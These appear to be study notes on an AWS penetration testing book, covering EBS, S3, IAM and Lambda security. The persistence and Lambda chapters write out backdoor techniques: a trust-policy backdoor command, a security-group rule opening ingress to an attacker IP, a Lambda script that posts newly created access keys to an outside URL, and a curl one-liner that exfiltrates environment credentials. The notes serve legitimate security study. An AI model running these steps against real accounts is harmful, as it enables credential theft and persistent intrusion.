<h3 id="2ab9fe29-1fc8-488c-8184-113ccb5a5e05" class="">S3</h3><ul id="20cd36a7-feac-46ae-886e-b449f9bfbede" class="bulleted-list"><li style="list-style-type:disc">used by EC2 to store EBS snapshots and instance store-backed AMIs</li></ul>
<h3 id="988dfe9f-9fae-4267-9126-d391fe5f7fca" class="">General Purpose SSD Volumes (GP2)</h3><ul id="de5d8bbf-a582-49cc-89fc-73cf25f0ee10" class="bulleted-list"><li style="list-style-type:disc">low level of latency and cost-effective</li></ul><ul id="d19753a3-db22-4952-8375-0b99f27bba04" class="bulleted-list"><li style="list-style-type:disc">1 GB to 16 TB</li></ul>
<h3 id="4fd74193-302b-4bf3-ae27-2094efd0b270" class="">Provisioned IOPS SSD (I01) Volumes</h3><ul id="99b01404-f2ba-4446-9512-b5ccdfea3d9e" class="bulleted-list"><li style="list-style-type:disc">like GP2, but superior</li></ul><ul id="2654b023-3d8f-4aa8-b287-fed34a846357" class="bulleted-list"><li style="list-style-type:disc">faster, supports more IOPS (input/output operations per second)</li></ul><ul id="dd797d10-140e-4b22-b98a-bec9f9fd0da9" class="bulleted-list"><li style="list-style-type:disc">designed for databases</li></ul><ul id="04639fe5-1f9e-45b6-8726-2879a49a7f79" class="bulleted-list"><li style="list-style-type:disc">4 GB to 16 TB</li></ul>
<h2 id="99f4f52c-9d61-443a-8c83-0969f52d4e54" class="">EC2 Firewall Settings</h2><ul id="ed92202a-ef23-421b-9cb2-caded5c4c03b" class="bulleted-list"><li style="list-style-type:disc">each EC2 has its own firewall (security groups)</li></ul><ul id="e4ac39c3-78a9-4579-9432-342c1f26f235" class="bulleted-list"><li style="list-style-type:disc">Linux AMIs configured to authenticate SSH using key pair authentication rather than a password</li></ul>
<h1 id="b3ab7e2e-936e-48b9-a709-dfce35f03e77" class="">Chapter 6: Elastic Block Stores and Snapshots - Retrieving Deleted Data</h1>
<h2 id="3c07c6e0-2d54-4c9a-b225-e1a30d754fc2" class="">EBS Volume Types and Encryption</h2><ul id="0ede9951-cb46-4326-90ed-61302226ce7c" class="bulleted-list"><li style="list-style-type:disc">two types of EBS:<ol type="1" id="fc5519cd-2d16-4ebd-b118-4766b7f3a6de" class="numbered-list" start="1"><li>SSD<ul id="fc7201d3-80f1-4c44-91a0-4ce6b23819fe" class="bulleted-list"><li style="list-style-type:disc">used for transactional workloads (frequent read/write operations)</li></ul><ul id="dc8730fa-bebd-4197-aef2-e86ac5816b25" class="bulleted-list"><li style="list-style-type:disc">high IOPS</li></ul></li></ol><ol type="1" id="8808127c-aec7-47c7-9849-107f0be2776d" class="numbered-list" start="2"><li>HDD<ul id="ffe9ada4-0d37-49f4-816c-312e0cb9b79c" class="bulleted-list"><li style="list-style-type:disc">meant for large streaming workloads  </li></ul></li></ol></li></ul><ul id="04036a48-11ff-4ac0-a43a-d869c3331e50" class="bulleted-list"><li style="list-style-type:disc">encryption made with Amazon KMS (implements AES 256-bit)<ul id="4819f578-07a1-4e37-a115-4e9e97057edc" class="bulleted-list"><li style="list-style-type:circle">encryption performed on data at rest, snapshots created from volume, and all disk I/O</li></ul></li></ul><ul id="5475572f-2122-4193-8e82-060d422865a7" class="bulleted-list"><li style="list-style-type:disc">CMK used to encrypt the data is stored in the volume that is attached to the EC2 instance</li></ul><ul id="2f1c613d-2826-4e17-99db-9f2f0d890b4d" class="bulleted-list"><li style="list-style-type:disc">all EBS volume types support full disk encryption, but not all EC2 instances support encrypted volumes</li></ul><ul id="ac57f241-3f34-4621-807f-fa32b3e81105" class="bulleted-list"><li style="list-style-type:disc">The following EC2 instances support EBS encryption:<p id="917d55a0-dcc2-4fd1-874e-79802aa40fb6" class=""><strong>General purpose</strong>: A1, M3, M4, M5, M5d, T2, and T3</p><p id="cf860275-f57b-41ce-b7fd-b6c24df06eea" class=""><strong>Compute optimized</strong>: C3, C4, C5, C5d, and C5n</p><p id="26676c1d-cc8d-4e6a-8daf-73f1dc804f40" class=""><strong>Memory optimized</strong>: cr1.8xlarge, R3, R4, R5, R5d, X1, X1e, and z1d</p><p id="3e5c53fb-e659-4840-b669-bf1017baade9" class=""><strong>Storage optimized</strong>: D2, h1.2xlarge, h1.4xlarge, I2, and I3</p><p id="c54810af-5a25-4a08-9899-1b050f0cb54e" class=""><strong>Accelerated computing</strong>: F1, G2, G3, P2, and P3</p><p id="e6b5d352-6ddc-46f9-bd7b-09a99b6fc4a8" class=""><strong>Bare metal</strong>: i3.metal, m5.metal, m5d.metal, r5.metal, r5d.metal, u-6tb1.metal,</p><p id="5f6bf33c-f859-4fe3-ab55-05fc38262ef9" class="">u-9tb1.metal, u-12tb1.metal, and z1d.metal</p></li></ul><ul id="110a328a-9329-4ec6-8dff-6463e663bf25" class="bulleted-list"><li style="list-style-type:disc">snapshots of encrypted storage volumes are encrypted by default<ul id="62c54318-f960-4673-98d6-a6c482c6cc0d" class="bulleted-list"><li style="list-style-type:circle">volumes created from those snapshots are also encrypted by default</li></ul></li></ul><ul id="0dc78eec-6b66-453e-8b6c-b69de66ccb3c" class="bulleted-list"><li style="list-style-type:disc">EC2 instance can simultaneously have encrypted and unencrypted storage volumes</li></ul><p id="f8b7864f-be7d-45e5-a4af-3812e53e13ce" class="">
</p>
<h1 id="77a1df54-aa9f-4cd0-a4e1-2516f4e02ed4" class="">Chapter 7: Identifying Vulnerable S3 Buckets</h1>
<h2 id="d983cb8d-48ee-4efe-a311-9f9d85950157" class="">S3 Permissions and the Access API</h2><p id="1e4744df-04ef-4e60-9724-748fd2be10b1" class="">Two S3 permission systems:</p><ol type="1" id="11a523e9-eb96-48c8-a94d-34edb11ab1b1" class="numbered-list" start="1"><li>Access Control Policies (ACPs)<ul id="718fe34b-c163-4215-8358-60de9c2c920c" class="bulleted-list"><li style="list-style-type:disc">simplified permissions system primarily used by web UI</li></ul></li></ol><ol type="1" id="bdc81445-98bb-4834-96c9-b9b4a6e96a21" class="numbered-list" start="2"><li>IAM Access Policies<ul id="aa057fdc-6199-4ae4-8af5-92e90710deb3" class="bulleted-list"><li style="list-style-type:disc">JSON objects</li></ul></li></ol><ul id="3a1cfdef-59e2-42c2-b32e-959f2ece2c80" class="bulleted-list"><li style="list-style-type:disc">to provide access to object, access to bucket must first be granted</li></ul><ul id="9b37da28-e209-4450-9e5d-33df5bed4704" class="bulleted-list"><li style="list-style-type:disc">policies can be applied to individual folders</li></ul><ul id="5956b890-523e-4e8e-ac98-06dc405b3cf6" class="bulleted-list"><li style="list-style-type:disc">files in a bucket can be public without the bucket being publicly listable</li></ul>
<h2 id="678a5c83-21fa-4913-be51-19fae45fb817" class="">ACPs / ACLs</h2><ul id="a63da680-3208-42e0-81bd-37dab7511c8d" class="bulleted-list"><li style="list-style-type:disc">every S3 bucket has ACL (access control list) attached to it</li></ul><ul id="11112bf6-97a3-443c-9590-ac2ff86e902f" class="bulleted-list"><li style="list-style-type:disc">Four main types of ACLs:<ol type="1" id="f11300f4-4aa6-4525-8c55-d6bd557e5799" class="numbered-list" start="1"><li>Read - view filenames, size, and last modified time of object. Can download objects that you have access to</li></ol><ol type="1" id="e3290675-a229-4fc0-83de-8f686ea5fb5d" class="numbered-list" start="2"><li>Write - read, delete, and upload objects. Can possibly delete objects you do not have permissions to.</li></ol><ol type="1" id="7d27a69e-906a-46b6-8397-61c070c92489" class="numbered-list" start="3"><li>Read-acp: view ACLs of any bucket or object that you have access to</li></ol><ol type="1" id="44fcb243-d0a5-45e6-9e59-526ff632b207" class="numbered-list" start="4"><li>Write-acp: modify ACL of any bucket or object you have access to</li></ol></li></ul><p id="0c4c9f67-f9d9-4ee9-8830-66851dca108d" class="">
</p>
<h3 id="594ba3c7-bdcb-4c1a-92f6-e750fcbfd5ea" class="">Bucket Policy</h3><pre id="97a74531-7f0b-4b27-861f-5579096ab47c" class="code"><code>{
	&quot;Version&quot;: &quot;2008-02-27&quot;,
	&quot;Statement&quot;: [
	{
		&quot;Sid&quot;: &quot;Statement&quot;,
		&quot;Effect&quot;: &quot;Allow&quot;,
		&quot;Principal&quot;: {
			&quot;AWS&quot;: &quot;arn:aws:iam::Account-ID:user/kirit&quot;
		},
		&quot;Action&quot;: [
			&quot;s3:GetBucketLocation&quot;,
			&quot;s3:ListBucket&quot;,
			&quot;s3:GetObject&quot;
		],
		&quot;Resource&quot;: [
			&quot;arn:aws:s3:::kirit-bucket&quot;
			]
		}
	]
}</code></pre>
<h1 id="b8f75651-6856-452a-90bd-2716aa8f20f5" class="">Chapter 8: Exploiting S3 Buckets</h1><ul id="4f019bb4-e763-4bc8-864b-d7c578cc97e0" class="bulleted-list"><li style="list-style-type:disc">JavaScript contained in S3 bucket can be backdoored<ul id="2c022d97-8fb9-420d-a846-151d382d99b1" class="bulleted-list"><li style="list-style-type:circle">Could infect a webapp when the JavaScript is executed</li></ul></li></ul><ul id="15a19748-e29c-4e6c-a204-193bd14d47af" class="bulleted-list"><li style="list-style-type:disc"><a href="https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/">https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/</a></li></ul>
<h2 id="7d5494c1-c186-4219-80e2-0ff334493c44" class="">Backdooring S3 Buckets for Persistence</h2>
<h3 id="5acfa147-39ef-4569-a034-9b7126113126" class=""><strong>Bucket Hijack</strong></h3><ul id="7da970a0-7175-4895-becb-c89a967b7c8f" class="bulleted-list"><li style="list-style-type:disc">S3 bucket may be deleted, but CNAME record would remain (essentially making the bucket name unclaimed)<ul id="35c16e31-abea-47d7-a2a5-8e4e9b2112c6" class="bulleted-list"><li style="list-style-type:circle">Create S3 bucket with same name and region as unclaimed bucket</li></ul><ul id="1e653a95-ef69-43ef-91e5-2f3688bda60e" class="bulleted-list"><li style="list-style-type:circle">This vulnerability is found with the <code>NoSuchBucket</code> error message</li></ul><ul id="3014ecfc-d626-4edf-bea6-429d6250b98c" class="bulleted-list"><li style="list-style-type:circle"><a href="https://hackerone.com/reports/399166">https://hackerone.com/reports/399166</a> ← HackerOne real bucket hijack</li></ul></li></ul>
<h1 id="87725274-3a1b-4c31-88ed-16209f53ac7f" class="">Chapter 9: IAM </h1><ul id="aabe8348-eb6c-484d-a882-e841c55110ce" class="bulleted-list"><li style="list-style-type:disc"><code>sts:GetCallerIdentity</code> is always allowed and cannot be denied<ul id="4f981db3-f419-41f6-b472-22e6ac45275d" class="bulleted-list"><li style="list-style-type:circle">UserID (in this case <code>AIDAJUTNAF4AKIRIATJ6W</code>) is how the user is referenced in the backend</li></ul><figure id="fb1122d5-8b58-4d7a-96b5-94c659fa2ae8" class="image"><a href="Hands%20on%20AWS%20Penetration%20Testing%20fb1122d58b584d7a96b594c659fa2ae8/Untitled.png"><img style="width:880px" src="/images/hands_on_aws_pentesting_sts.png"/></a></figure><ul id="f894329c-3f4b-40d0-940c-17d03b3f7c4f" class="bulleted-list"><li style="list-style-type:circle">can enumerate users with the account ID without creating logs in target account</li></ul></li></ul><ul id="2797f031-c5a6-44e5-be3e-c32817e7f01a" class="bulleted-list"><li style="list-style-type:disc">best practice is to specify the resource that the action applies to, rather than doing <code>“Resource”: “*”</code>  <ul id="eeea4d98-d6f3-49e7-b724-31c9a77ce9d2" class="bulleted-list"><li style="list-style-type:circle">for example, the following is bad practice </li></ul><pre id="98c5f3aa-0c33-480d-8ad2-ebb32f57e98e" class="code"><code>&quot;Action&quot;: &quot;ec2:*&quot;,
&quot;Resource&quot;: &quot;*&quot;</code></pre></li></ul><ul id="7b4de9c8-3561-419e-86c7-c9ca32c0769c" class="bulleted-list"><li style="list-style-type:disc">optional <code>Condition</code> key  - under what conditions specifications in the <code>Statement</code> apply:<ul id="bb37733f-a937-4275-9a31-c51c1dc47e6f" class="bulleted-list"><li style="list-style-type:circle">e.g. MFA must be used, source IP address, timeframe, etc. <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html</a> </li></ul></li></ul><ul id="3397a5c7-0b00-4dcb-9136-ddb85fab37ff" class="bulleted-list"><li style="list-style-type:disc">security best practice to not use inline policies</li></ul><ul id="10f939ab-db89-4c3b-9000-2145b0ff5916" class="bulleted-list"><li style="list-style-type:disc">managed policies allow the following:<ol type="1" id="e811370e-4e79-46e3-9fff-309748a9d376" class="numbered-list" start="1"><li>Reusability</li></ol><ol type="1" id="9919cba2-cb73-4a55-b409-3c315e1768b1" class="numbered-list" start="2"><li>Central change management</li></ol><ol type="1" id="212a54de-f1f8-442b-b002-5b2a36438316" class="numbered-list" start="3"><li>Versioning and rolling back</li></ol><ol type="1" id="6375d76f-1833-4dea-8dea-e81c480c2e1c" class="numbered-list" start="4"><li>Delegating permissions management</li></ol></li></ul><ul id="78448577-7847-4719-8c1f-251d198d43ef" class="bulleted-list"><li style="list-style-type:disc">inline policies can be converted to managed policies</li></ul><ul id="41fd0849-d902-4aa3-8e86-9a48fc61947d" class="bulleted-list"><li style="list-style-type:disc">inline policies can be created during or after creation of identity    </li></ul>
<h2 id="11836c93-c0ab-4928-803e-ef356b37ff95" class="">Roles and Groups</h2><ul id="51d8fe70-3079-4d90-8a86-3cc8958c0c2d" class="bulleted-list"><li style="list-style-type:disc">roles cannot be added to groups</li></ul>
<h3 id="50823fea-b38a-453d-8417-4e785f16ff01" class="">Roles</h3><ul id="3097bdbc-0a87-4613-a907-117a2389081e" class="bulleted-list"><li style="list-style-type:disc">default lifespan of role API keys (<code>sts:AssumeRole</code>) is 1 hour<ul id="efa7e363-6237-4c4f-a46a-2ebc20cc9316" class="bulleted-list"><li style="list-style-type:circle"> roles allow for stricter auditing and permissions management</li></ul></li></ul><ul id="a52b9350-d353-4054-86b5-2bc8d9b104ff" class="bulleted-list"><li style="list-style-type:disc"><span style="border-bottom:0.05em solid">Trust relationships</span>: specify who can assume the role and under what conditions<pre id="4e064b2e-baec-45b6-9bb8-0c8ce91d2db7" class="code"><code>{
	&quot;Version&quot;: &quot;2012-10-17&quot;,
	&quot;Statement&quot;: [
	{
		&quot;Effect&quot;: &quot;Allow&quot;,
			&quot;Principal&quot;: {
				&quot;Service&quot;: &quot;ec2.amazonaws.com&quot;
			},
			&quot;Action&quot;: &quot;sts:AssumeRole&quot;
		}
	]
}</code></pre><ul id="43e4d1b7-62fa-4a72-b273-ceec140ad534" class="bulleted-list"><li style="list-style-type:circle">Principals can include other IAM users, AWS services, or AWS account<ul id="7f6e2ea0-6b8a-4432-b800-dd507012609e" class="bulleted-list"><li style="list-style-type:square">Can assume cross-account roles for persistence</li></ul></li></ul></li></ul>
<h3 id="be7188d0-18ae-4220-bb4a-82569f7f6f66" class="">Groups</h3><ul id="c424ac37-4f16-4495-8496-fefe7ce110cb" class="bulleted-list"><li style="list-style-type:disc">used to give a set of users the same permissions</li></ul><ul id="8efc512c-60f3-4ce7-8418-e9f498c97299" class="bulleted-list"><li style="list-style-type:disc">a user can be part of 10 groups at most</li></ul><ul id="b8734621-c9ba-4f3c-bd0f-ace6f58dc4fc" class="bulleted-list"><li style="list-style-type:disc">a group can hold up to as many users that are allowed in the account</li></ul>
<h2 id="e5a3ecac-9e7b-449d-af26-a3d4b28a4968" class="">API Request Signing</h2><ul id="6c82b1fc-b73f-4307-b8ac-e75f8f5e4434" class="bulleted-list"><li style="list-style-type:disc">most AWS API calls require data be signed before it is sent to AWS servers<ul id="27b000ab-372d-4941-a9f6-2acbbfaccb2b" class="bulleted-list"><li style="list-style-type:circle">allows server to verify identity of API caller</li></ul><ul id="3eacf699-cc23-4ce5-a8b2-5a790e1adbec" class="bulleted-list"><li style="list-style-type:circle">protect data from modification while it is in transit</li></ul><ul id="d5512463-5dd4-41b0-b386-573dd0c3d964" class="bulleted-list"><li style="list-style-type:circle">mostly prevents replay attacks (signed request valid for five minutes by default) </li></ul></li></ul><p id="52565cec-48fe-4128-a257-ac2a1481ddda" class="">
</p>
<h1 id="544e9aae-74e6-4c0e-bd14-54af8be5f40a" class="">Chapter 10: Privesc, Boto3, and Pacu</h1><ul id="f82e5271-e552-47c6-ac1f-190d42596258" class="bulleted-list"><li style="list-style-type:disc"><code>AccessDenied</code>errors are very noisy</li></ul><ul id="43eb10cd-ef09-4b22-8958-cab68e39afbe" class="bulleted-list"><li style="list-style-type:disc">boto3 is used in the backend of AWS CLI</li></ul>
<h2 id="3b7b2b50-ef00-4db2-a171-db4de6b4c711" class="">Boto3</h2><pre id="e5436673-ef3d-4fdc-8f60-2b95f732b74f" class="code"><code>#!/usr/bin/env python3

import boto3
session = boto3.session.Session(profile_name=&#x27;Test&#x27;, region_name=&#x27;us-
west-2&#x27;) # gets creates session from profile creds
client = session.client(&#x27;iam&#x27;)</code></pre><ul id="f6d2ebcb-11a3-41d3-8989-95be72a1cd80" class="bulleted-list"><li style="list-style-type:disc">Pacu can be used to automate some enumeration tasks<ul id="d256d14e-9464-4115-a97c-066bfe339005" class="bulleted-list"><li style="list-style-type:circle">good for enumeration but outdated and not reliable for exploitation</li></ul></li></ul>
<h1 id="bbae1bb3-dad6-4bf2-80a2-52638f707db7" class="">Chapter 11: Persistence</h1><ul id="0201111f-dcef-4413-a9ed-06c74e458c31" class="bulleted-list"><li style="list-style-type:disc">you can backdoor user creds, role trust relationships, EC2 security groups, Lambda functions, etc.</li></ul><ul id="2911e7d3-ae27-4dba-a71c-a62016c2fbe6" class="bulleted-list"><li style="list-style-type:disc">best practice is to use SSO with temporary federated access rather than an IAM user with an access key and secret access key</li></ul>
<h2 id="44aed29a-4b14-41c7-8f59-47d3c280d6e8" class="">Backdooring Users</h2>
<h3 id="d68f7725-b5a4-4baa-9b08-025158cf2c60" class="">Create Another Access Key Pair</h3><p id="7ad273fb-11c9-47ba-9fdf-885c2e257e98" class=""><code>aws iam list-access-keys --user-name &lt;USER_NAME&gt; --profile &lt;PROFILE&gt;</code></p><ul id="028b7614-d5b1-448c-8210-dfdbd4090b12" class="bulleted-list"><li style="list-style-type:disc">each user has limit of two access key pairs, so create another access key pair</li></ul><ul id="4d9056af-8d07-42dd-8b48-9016c9bdffb2" class="bulleted-list"><li style="list-style-type:disc">simple, easy to detect</li></ul><ul id="55d4e117-499b-4d03-9f7f-2f6dcba2a616" class="bulleted-list"><li style="list-style-type:disc">backdoor removed after compromised IAM user account is deleted</li></ul><ul id="eec88145-4c05-4bea-8970-31db0677ebe1" class="bulleted-list"><li style="list-style-type:disc">can privesc with <code>iam:CreateAccessKey</code></li></ul>
<h2 id="6f7f5b39-04cc-46c2-b789-0ea4b1c4551f" class="">Backdooring Role Trust Relationships</h2><ul id="7ff7be21-54ec-42d0-9b8e-a47008f9c1d3" class="bulleted-list"><li style="list-style-type:disc">most common backdoor technique</li></ul><ul id="2ee31918-b566-4412-b3db-e8d05f757638" class="bulleted-list"><li style="list-style-type:disc">role trust policies can be updated at will</li></ul><ul id="34473383-98e8-40af-9b68-c5a3113002bf" class="bulleted-list"><li style="list-style-type:disc">role trust policies provide access to other AWS accounts<ul id="1c6af8ab-4f39-4833-9054-dbad2ea8c70a" class="bulleted-list"><li style="list-style-type:circle">can update trust policy to create relationship between role and personal attacker AWS account</li></ul></li></ul><ul id="3caca484-cb67-48b2-8155-8cda080d0d66" class="bulleted-list"><li style="list-style-type:disc">not all trust policies of roles can be updated<ul id="ac3223bc-b8e1-4a8b-a7e0-ca2aae8e4f54" class="bulleted-list"><li style="list-style-type:circle">generally true for service-linked roles, for example:</li></ul><p id="8ee69265-145d-474a-a05f-845d6d5a801c" class=""><strong>Input</strong></p><p id="a0d94957-a511-4c81-9a70-17adc849249e" class=""><code>aws iam create-service-linked-role --aws-service-name lex.amazonaws.com --description &quot;My service-linked role to support Lex”</code></p><p id="9cfdeef3-1004-426a-914a-2f11121e32d7" class=""><strong>Output</strong></p><pre id="d8672efd-856f-4dd8-bd4d-5521042b96c5" class="code code-wrap"><code>{
  &quot;Role&quot;: {
      &quot;Path&quot;: &quot;/aws-service-role/lex.amazonaws.com/&quot;,
      &quot;RoleName&quot;: &quot;AWSServiceRoleForLexBots&quot;,
      &quot;RoleId&quot;: &quot;AROA1234567890EXAMPLE&quot;,
      &quot;Arn&quot;: &quot;arn:aws:iam::1234567890:role/aws-service-role/lex.amazonaws.com/AWSServiceRoleForLexBots&quot;,
      &quot;CreateDate&quot;: &quot;2019-04-17T20:34:14+00:00&quot;,
      &quot;AssumeRolePolicyDocument&quot;: {
          &quot;Version&quot;: &quot;2012-10-17&quot;,
          &quot;Statement&quot;: [
              {
                  &quot;Action&quot;: [
                      &quot;sts:AssumeRole&quot;
                  ],
                  &quot;Effect&quot;: &quot;Allow&quot;,
                  &quot;Principal&quot;: {
                      &quot;Service&quot;: [
                          &quot;lex.amazonaws.com&quot;
                      ]
                  }
              }
          ]
      }
  }
}</code></pre></li></ul><ul id="b5548c29-1719-48cd-bb99-2f9ef5d3a0dd" class="bulleted-list"><li style="list-style-type:disc">all AWS service roles contain path <code>/aws-service-role/</code><ul id="9f369d2b-1bde-43aa-9cd5-e95842868228" class="bulleted-list"><li style="list-style-type:circle">no other roles allowed to use this path</li></ul></li></ul>
<h3 id="f622b0de-95e4-4414-a679-d0dab4652846" class="">IAM Trust Policy</h3><p id="bbe01b0c-3a3f-418c-8b17-f13bedfe1c8d" class="">The following trust policy allows the EC2 service to assume a role </p><pre id="8507a320-e241-4b0e-b4c4-c06524f59f55" class="code"><code>{
	&quot;Version&quot;: &quot;2012-10-17&quot;,
	&quot;Statement&quot;: [
		{
			&quot;Effect&quot;: &quot;Allow&quot;,
			&quot;Principal&quot;: {
				&quot;Service&quot;: &quot;ec2.amazonaws.com&quot;
			},
			&quot;Action&quot;: &quot;sts:AssumeRole&quot;
		}
	]
}</code></pre><ul id="6ec57bb1-fbd7-4f66-9b7f-daaee82b3b9d" class="bulleted-list"><li style="list-style-type:disc">useful for when IAM role added to EC2 instance profile, and then the instance profile is attached to an EC2 instance<ul id="2b5a9b6e-3ce6-485d-aa5e-d73cc39aede1" class="bulleted-list"><li style="list-style-type:circle">allows for temp creds to be used by EC2 instance to perform role actions</li></ul></li></ul>
<h3 id="8a359df3-ca92-4c43-8dff-97a07e716cd4" class="">Adding Backdoor to Trust Policy</h3><ul id="0c38976a-c3ea-4e4f-a03c-cdf90856d489" class="bulleted-list"><li style="list-style-type:disc">do not overwrite trust policy!<ul id="65e2ec26-ca77-4f40-b0b8-c5ae72993e70" class="bulleted-list"><li style="list-style-type:circle">update the policy with your ARN</li></ul><p id="244ecd67-b5f6-47d4-bebc-5e027f978a66" class=""><code>aws iam update-assume-role-policy --role-name &lt;ROLE_NAME&gt; --policy-document </code><code><a href="file://trust-policy-backdoor.json">file://trust-policy-backdoor.json</a></code><code> --profile &lt;PROFILE&gt;</code>
<div class="indented"><ul id="a8a6197e-20aa-4001-a09a-f736a1ea32f8" class="bulleted-list"><li style="list-style-type:disc">note that the <code>policy-backdoor.json</code> will contain the cross-account ARN </li></ul></div></p></li></ul>
<h2 id="72231594-f1de-48a3-968b-a23e35d5dd1b" class="">Backdooring EC2 Security Groups</h2><ul id="1ad12519-6562-41e7-b8c1-ca8fe57a90c2" class="bulleted-list"><li style="list-style-type:disc"><code>IpPermissions</code> contains inbound traffic rules</li></ul><ul id="9bb7cf0c-4d1e-4b41-a40a-c8a2695e12b1" class="bulleted-list"><li style="list-style-type:disc"><code>IpPermissionsEgress</code> contains outbound traffic rules</li></ul><ul id="14d6c6a7-82ed-4bcb-8746-fb79b57caf46" class="bulleted-list"><li style="list-style-type:disc">to backdoor, you can allow inbound traffic from your IP address<ul id="b8e7c409-ad8d-4616-a085-cc87170d1cf4" class="bulleted-list"><li style="list-style-type:circle"><code>aws ec2 authorize-security-group-ingress --group-id sg-0315cp741b51fr4d0 --
protocol tcp --port &lt;PORTS&gt; --cidr &lt;ATTACKER_IP&gt;</code></li></ul></li></ul>
<h2 id="824eae1d-356e-4300-9382-3c99a4c922d1" class="">Backdooring Lambda Function</h2><ul id="796d785f-7ced-4442-8a34-d5154147ef52" class="bulleted-list"><li style="list-style-type:disc">trigger Lambda function upon a certain event<ul id="f534cf45-12c5-464d-a87e-d47ea5b86673" class="bulleted-list"><li style="list-style-type:circle">works only if CloudTrail logging is enabled (because the Lambda function backdoor will be configured to trigger upon an event) </li></ul><ul id="ed7165a7-516a-4817-b78e-d5c61d5f70b6" class="bulleted-list"><li style="list-style-type:circle">can create backdoor such as creating a second access key pair for a new user, then exfiltrating the key pair</li></ul><pre id="1a2c4077-3253-4c59-8af8-f6739c066636" class="code"><code>import boto3
from botocore.vendored import requests

def lambda_handler(event,context):
	if event[&#x27;detail&#x27;][&#x27;eventName&#x27;]==&#x27;CreateUser&#x27;:
	client=boto3.client(&#x27;iam&#x27;)
	try:
		response=client.create_access_key(UserName=event[&#x27;detail&#x27;][&#x27;requestParamete
		rs&#x27;][&#x27;userName&#x27;])
		requests.post(&#x27;POST_URL&#x27;,data={&quot;AKId&quot;:response[&#x27;AccessKey&#x27;][&#x27;AccessKeyId&#x27;],
		&quot;SAK&quot;:response[&#x27;AccessKey&#x27;][&#x27;SecretAccessKey&#x27;]})
		except:
		pass
	return</code></pre></li></ul><ul id="d97b602f-5611-4ab5-9960-2ca1b69e95b2" class="bulleted-list"><li style="list-style-type:disc">best practice to enable CloudTrail across all AWS regions</li></ul><ul id="565f13ff-7a2d-4e42-be84-b9e9fc37743b" class="bulleted-list"><li style="list-style-type:disc">it is better to backdoor existing Lambda functions as it is stealthier<ul id="1d077ddf-4ba0-4577-9ecd-dcd48d1eb592" class="bulleted-list"><li style="list-style-type:circle">this avoids creating new resources in an environment, which can be noisy</li></ul></li></ul>
<h2 id="00b533e8-047d-4e1f-938d-2994f649652e" class="">Backdooring ECR</h2><ul id="7bbc2058-c5f6-441b-99ea-ad46f830ce21" class="bulleted-list"><li style="list-style-type:disc">if it is possible to log into the container registry, pull a Docker image, and update it in the AWS environment, then an image can be modified with an attacker’s malware to establish persistence  </li></ul>
<h1 id="c27ae794-0a9f-419f-a5ec-f38048763818" class="">Chapter 12: Pentesting Lambda</h1><ul id="f5e0a311-e87a-49dd-8366-3ccc99582911" class="bulleted-list"><li style="list-style-type:disc">Lamba is considered serverless, but technically isolated servers are spun up for the duration of a function’s runtime<ul id="c279a430-65c5-47d1-b68a-b3bddc2be7cc" class="bulleted-list"><li style="list-style-type:circle">filesystem is read-only except for <code>/tmp</code></li></ul><ul id="cbb60d7e-31ce-412d-a3ed-bcc419fb9e45" class="bulleted-list"><li style="list-style-type:circle">you are a low-privileged user</li></ul></li></ul><ul id="0efcd91d-287d-4987-a9eb-6917d92e5d16" class="bulleted-list"><li style="list-style-type:disc">check environment variables of Lambda functions<ul id="588577d6-a477-424a-8678-f336c30210eb" class="bulleted-list"><li style="list-style-type:circle"><code>aws lambda list-functions --profile &lt;PROFILE&gt;</code> </li></ul></li></ul>
<h2 id="0401dea5-703f-42d5-9c0f-01e46a60a462" class="">Event Injection</h2><ul id="20dfb3ea-0cee-4098-9dc2-4d51a14f1e74" class="bulleted-list"><li style="list-style-type:disc">if RCE can be obtained on the Lambda function, creds can be exfiltrated via environment variables (as opposed to EC2 where it is in the metadata serice)<ul id="f7abc9d4-efcf-4a87-8986-6c494b3118a2" class="bulleted-list"><li style="list-style-type:circle">read environment variables with <code>env</code> and exfiltrate with <code>curl</code> (<code>curl -X POST -d `env` &lt;ATTACKER_IP&gt;</code>)<ul id="171bf43f-3e2e-4974-8876-c422320afd60" class="bulleted-list"><li style="list-style-type:square">bash runs commands enclosed in backticks (`) first</li></ul></li></ul><ul id="9349751f-7fa9-43e8-ab1a-53426f1aaf04" class="bulleted-list"><li style="list-style-type:circle">Lambda has <code>curl</code> by default</li></ul></li></ul><ul id="6868fe68-967c-4704-80c0-20e56053ffea" class="bulleted-list"><li style="list-style-type:disc">may be able to indirectly invoke a function that is set to automatically trigger upon an event in a different service<ul id="863c6f61-703b-4c6a-a268-075858e7a3a9" class="bulleted-list"><li style="list-style-type:circle">e.g. lambda function triggers on an uploaded file in an S3 bucket: </li></ul><p id="4e2896b1-173c-4930-9479-3f012393a14f" class=""><code>aws lambda get-policy --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2</code></p><pre id="38ccdfd8-14a6-4ecf-b715-0efb76db4d0a" class="code"><code>{
	&quot;Version&quot;: &quot;2012-10-17&quot;,
	&quot;Id&quot;: &quot;default&quot;,
	&quot;Statement&quot;: [
		{
			&quot;Sid&quot;:
			&quot;000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul&quot;,
			&quot;Effect&quot;: &quot;Allow&quot;,
			&quot;Principal&quot;: {
				&quot;Service&quot;: &quot;s3.amazonaws.com&quot;
			},
			&quot;Action&quot;: &quot;lambda:InvokeFunction&quot;,
			&quot;Resource&quot;: &quot;arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction&quot;,
			&quot;Condition&quot;: {
				&quot;StringEquals&quot;: {
					&quot;AWS:SourceAccount&quot;: &quot;000000000000&quot;
				},
				&quot;ArnLike&quot;: {
					&quot;AWS:SourceArn&quot;: &quot;arn:aws:s3:::bucket-for-lambda-pentesting&quot;
				}
			}
		}
	]
}</code></pre><ul id="4c159e18-5319-4d51-9cdc-c88c97d74934" class="bulleted-list"><li style="list-style-type:circle">note that not all Lambda functions have a resource policy</li></ul></li></ul><ul id="4db55c44-57d3-4c3c-a260-ac7515d466ec" class="bulleted-list"><li style="list-style-type:disc">default execution timeout for function is three seconds</li></ul>
